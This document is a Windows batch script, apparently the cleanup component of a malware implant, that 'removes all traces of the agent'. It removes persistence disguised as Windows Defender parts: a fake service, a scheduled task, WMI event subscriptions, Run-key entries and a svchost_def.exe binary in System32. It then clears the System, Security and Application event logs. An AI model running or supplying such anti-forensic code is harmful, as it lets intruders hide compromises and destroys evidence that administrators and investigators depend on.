@echo off
setlocal enabledelayedexpansion

:: Stealth Uninstallation Script
:: Removes all traces of the agent

set "INSTALL_DIR=%SYSTEMROOT%\System32"
set "SERVICE_NAME=WinDefendService"

:: Check for admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Requesting elevated privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

echo [INFO] Windows System Service Removal
echo [INFO] Stopping system components...

:: Stop and remove service
sc stop "%SERVICE_NAME%" >nul 2>&1
timeout /t 3 >nul
sc delete "%SERVICE_NAME%" >nul 2>&1

:: Remove scheduled tasks
echo [INFO] Removing scheduled tasks...
schtasks /delete /tn "Microsoft\Windows\WindowsDefender\SystemScan" /f >nul 2>&1

:: Remove WMI Event Subscriptions
echo [INFO] Cleaning WMI subscriptions...
powershell -Command "Get-WmiObject -Namespace 'root\subscription' -Class __FilterToConsumerBinding | Where-Object {$_.Consumer -like '*SystemDefender*'} | Remove-WmiObject -ErrorAction SilentlyContinue; Get-WmiObject -Namespace 'root\subscription' -Class CommandLineEventConsumer | Where-Object {$_.Name -eq 'SystemDefenderConsumer'} | Remove-WmiObject -ErrorAction SilentlyContinue; Get-WmiObject -Namespace 'root\subscription' -Class __EventFilter | Where-Object {$_.Name -eq 'SystemDefender'} | Remove-WmiObject -ErrorAction SilentlyContinue" >nul 2>&1

:: Remove registry entries
echo [INFO] Cleaning registry entries...
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /f >nul 2>&1
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\%SERVICE_NAME%" /f >nul 2>&1

:: Remove files
echo [INFO] Removing system files...
taskkill /f /im "svchost_def.exe" >nul 2>&1
timeout /t 2 >nul

del /f /q "%INSTALL_DIR%\svchost_def.exe" >nul 2>&1
del /f /q "%INSTALL_DIR%\msvcr120_sys.dll" >nul 2>&1

:: Remove any remaining traces
echo [INFO] Cleaning temporary files...
del /f /q "%TEMP%\sysbackup_*" >nul 2>&1
rmdir /s /q "%TEMP%\sysbackup_*" >nul 2>&1

:: Clear relevant event logs
echo [INFO] Clearing event logs...
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Application >nul 2>&1

:: Remove any mutex objects
echo [INFO] Cleaning system objects...
powershell -Command "Get-Process | Where-Object {$_.ProcessName -like '*svchost_def*'} | Stop-Process -Force -ErrorAction SilentlyContinue" >nul 2>&1

echo [INFO] System service removal completed successfully.
echo [INFO] All components have been removed.
echo [INFO] System restored to original state.

pause
exit /b 0